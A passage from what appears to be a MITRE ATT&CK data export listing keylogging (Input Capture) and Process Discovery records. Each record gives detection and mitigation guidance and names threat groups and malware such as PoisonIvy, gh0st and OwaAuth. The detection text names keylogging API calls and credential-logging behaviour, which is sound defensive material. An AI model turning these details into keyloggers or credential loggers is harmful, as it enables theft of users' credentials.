whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],"Software: CosmicDuke, TinyBaron, ...","['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
900,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Group/G0032|Lazarus Group]] malware KiloAlfa contains keylogging functionality.[[CiteRef::Novetta Blockbuster Tools]]'],['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],[],"['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
901,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Group/G0022|APT3]] has used a keylogging tool that records keystrokes in encrypted files.[[CiteRef::Symantec Buckeye]]'],['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],[],"['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
902,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0012|PoisonIvy]] contains a keylogger.[[CiteRef::FireEye Poison Ivy]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],"Software: PoisonIvy, Poison Ivy","['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
903,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0152|EvilGrab]] has the capability to capture keystrokes.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],Software: EvilGrab,"['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
904,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0062|DustySky]] contains a keylogger.[[CiteRef::DustySky]]'],['Molerats'],"['Molerats', 'Gaza cybergang', 'Operation Molerats']",['G0021'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],"Software: DustySky, NeD Worm","['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
905,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0012|PoisonIvy]] contains a keylogger.[[CiteRef::FireEye Poison Ivy]]'],['Molerats'],"['Molerats', 'Gaza cybergang', 'Operation Molerats']",['G0021'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],"Software: PoisonIvy, Poison Ivy","['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
906,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0070|HTTPBrowser]] is capable of capturing keystrokes on victims.[[CiteRef::Dell TG-3390]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],"Software: HTTPBrowser, Token Control, HttpDump","['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
907,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']","['[[Software/S0072|OwaAuth]] captures and DES-encrypts credentials before writing the username and password to a log file, <code>C:\\log.txt</code>.[[CiteRef::Dell TG-3390]]']",['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],Software: OwaAuth,"['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
908,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Group/G0027|Threat Group-3390]] actors installed a credential logger on Microsoft Exchange servers.[[CiteRef::Dell TG-3390]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],[],"['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
909,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0065|4H RAT]] has the capability to obtain a listing of running processes (including loaded modules).[[CiteRef::CrowdStrike Putter Panda]]'],['Putter Panda'],"['Putter Panda', 'APT2', 'MSUpdater']",['G0024'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",Software: 4H RAT,['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
910,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0032|gh0st]] RAT is able to list processes.[[CiteRef::FireEye Hacking Team]]'],['PittyTiger'],['PittyTiger'],['G0011'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",Software: gh0st,['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
911,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0057|Tasklist]] can be used to discover processes running on a system.[[CiteRef::Microsoft Tasklist]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",Software: Tasklist,['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
912,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0021|Derusbi]] collects current and parent process IDs.[[CiteRef::Fidelis Turbo]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",Software: Derusbi,['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
913,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0142|StreamEx]] has the ability to enumerate processes.[[CiteRef::Cylance Shell Crew Feb 2017]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",Software: StreamEx,['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
914,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0009|Deep Panda]] uses the Microsoft [[Software/S0057|Tasklist]] utility to list processes running on systems.[[CiteRef::Alperovitch 2014]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",[],['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
915,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['573'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0151|HALFBAKED]] can obtain information about running processes on the victim.[[CiteRef::FireEye FIN7 April 2017]]'],['FIN7'],['FIN7'],['G0046'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about processes, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Administrator, SYSTEM may provide better process ownership details']",Software: HALFBAKED,['Discovery'],['Technique/T1057'],['Process Discovery'],https://attack.mitre.org/wiki/Technique/T1057
